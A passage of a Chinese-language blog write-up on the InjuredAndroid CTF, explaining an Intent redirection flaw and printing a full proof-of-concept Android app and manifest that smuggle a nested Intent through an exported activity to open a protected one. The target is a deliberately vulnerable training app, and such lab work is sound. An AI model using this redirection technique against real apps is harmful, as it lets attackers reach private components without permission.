+<p>f方法传入一个intent对象 并且通过<code>getParcelableExtra</code>方法解析<code>access_protected_component</code>嵌套的intent。</p>
+<p>Parcelable 是 Android 特有的序列化机制。 而 <code>getParcelableExtra</code>相当于反序列化，会按照格式解析传入的数据。</p>
+<p>if语句内<code>startActivity(intent2)</code>可以调用其他activity</p>
+<p>所以可以通过<code>b3nac.injuredandroid.ExportedProtectedIntent.f()</code>来触发<code>b3nac.injuredandroid.FlagTwelveProtectedActivity</code>，这就是 Intent 重定向漏洞。</p>
+<p>数据流向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">攻击者 (外部) —Intent—&gt; ExportedProtectedIntent (跳板) —getParcelableExtra反序列化—&gt; intent2 (内部对象) —startActivity—&gt; FlagTwelveProtectedActivity (私有目标)<br></code></pre></td></tr></table></figure>
+
+<p><code>access_protected_component</code>的内容是intent对象，而不是字符串。而adb不好传递对象，所以可以写一个app来生成并传入数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs plain">package com.example.poc;<br><br>import android.content.Intent;<br>import android.os.Bundle;<br>import android.util.Log;<br>import android.widget.TextView;<br>import android.widget.Toast;<br>import androidx.appcompat.app.AppCompatActivity;<br><br>public class MainActivity extends AppCompatActivity &#123;<br><br>    @Override<br>    protected void onCreate(Bundle savedInstanceState) &#123;<br>        super.onCreate(savedInstanceState);<br><br>        // 设置一个简单的界面，告知用户攻击正在进行<br>        TextView textView = new TextView(this);<br>        textView.setText(&quot;poc start&quot;);<br>        setContentView(textView);<br><br>        // 核心：直接调用攻击方法<br>        startExploit();<br>    &#125;<br><br>    private void startExploit() &#123;<br>        try &#123;<br>            /* * 1. 构造【最终目标】 (The Target)<br>             * 类名：FlagTwelveProtectedActivity (这是私有的)<br>             */<br>            Intent targetIntent = new Intent();<br>            targetIntent.setClassName(&quot;b3nac.injuredandroid&quot;, &quot;b3nac.injuredandroid.FlagTwelveProtectedActivity&quot;);<br><br>            // 传入逻辑要求的 Key: &quot;totally_secure&quot;<br>            // 只要值是 https:// 开头即可<br>            targetIntent.putExtra(&quot;totally_secure&quot;, &quot;https://hacker.exploit.auto&quot;);<br><br>            /* * 2. 构造【攻击跳板】 (The Proxy)<br>             * 类名：ExportedProtectedIntent (这是导出的，我们可以直接访问)<br>             */<br>            Intent proxyIntent = new Intent();<br>            proxyIntent.setClassName(&quot;b3nac.injuredandroid&quot;, &quot;b3nac.injuredandroid.ExportedProtectedIntent&quot;);<br><br>            // 将 targetIntent 序列化后作为 Extra 放入<br>            // 目标 App 会取出这个 Intent 并代为执行 startActivity()<br>            proxyIntent.putExtra(&quot;access_protected_component&quot;, targetIntent);<br><br>            /* * 3. 自动执行<br>             * 在 onCreate 中调用后，App 一启动就会立即把 Intent 发送出去<br>             */<br>            startActivity(proxyIntent);<br><br>            Toast.makeText(this, &quot;Exploit send success！&quot;, Toast.LENGTH_SHORT).show();<br><br>            // (可选) 攻击完成后关闭自己，让用户直接看到目标界面<br>            finish();<br><br>        &#125; catch (Exception e) &#123;<br>            Log.e(&quot;ExploitError&quot;, &quot;failed: &quot; + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;<br>    xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt;<br><br><br><br>    &lt;application<br>        android:allowBackup=&quot;true&quot;<br>        android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot;<br>        android:fullBackupContent=&quot;@xml/backup_rules&quot;<br>        android:icon=&quot;@mipmap/ic_launcher&quot;<br>        android:label=&quot;@string/app_name&quot;<br>        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;<br>        android:supportsRtl=&quot;true&quot;<br>        android:theme=&quot;@style/Theme.Poc&quot;<br>        tools:targetApi=&quot;31&quot;<br>        &gt;<br>    &lt;activity<br>        android:name=&quot;.MainActivity&quot;<br>        android:exported=&quot;true&quot;&gt;<br>        &lt;intent-filter&gt;<br>            &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;<br>            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;<br>        &lt;/intent-filter&gt;<br>    &lt;/activity&gt;<br><br>&lt;/application&gt;<br><br>&lt;/manifest&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772184919580-21b12366-2715-491e-a552-f2a2bbcf0827.gif" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%A0%94%E7%A9%B6/" class="category-chain-item">研究</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%A0%94%E7%A9%B6/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>InjuredAndroid - CTF 7-12</div>
+      <div>http://example.com/2026/02/27/InjuredAndroid - CTF 7-12/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/24/InjuredAndroid%20-%20CTF%200-6/" title="InjuredAndroid - CTF 0-6">
+                        <span class="hidden-mobile">InjuredAndroid - CTF 0-6</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
